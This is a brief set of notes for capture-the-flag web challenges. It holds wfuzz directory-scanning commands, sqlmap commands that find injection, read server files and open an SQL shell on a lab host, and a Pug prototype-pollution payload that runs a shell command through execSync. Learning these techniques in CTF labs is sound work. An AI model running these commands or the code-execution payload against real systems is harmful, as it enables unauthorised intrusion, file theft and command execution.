# Web Challanges

## Information Gathering

### scan for dirs

#### wfuzz
    wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 -R2 http://138.68.182.108:32660/FUZZ

#### dirsearch
    https://github.com/maurosoria/dirsearch
    

### scan for files
    wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 -R2 http://138.68.182.108:32660/administrat/include/FUZZ.php

## SQL Exploits

### sqlmap

#### scan for SQL vulnerabilities
    sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1

#### list tables
    sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 --tables

#### file structure, e.g. apache
    sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 --common-files

#### read file
    sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 --read-files=/var/www/html/mail/contact_me.php

#### interactive SQL shell
    # DB freelance
    sqlmap -u http://138.68.182.108:31930/portfolio.php?id=1 -D freelancer --sql-shell

## Deobfuscation

### js

[ JStillery ]( https://en.kali.tools/?p=1354 )

### php

https://www.unphp.net/

## Polution

AST Injection

Pug

https://blog.p6.is/AST-Injection/#Pug

e.g.

```JSON
{"some_key":"some_value",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`cat flagfile > /app/static/stattest.html`)"
}}
```
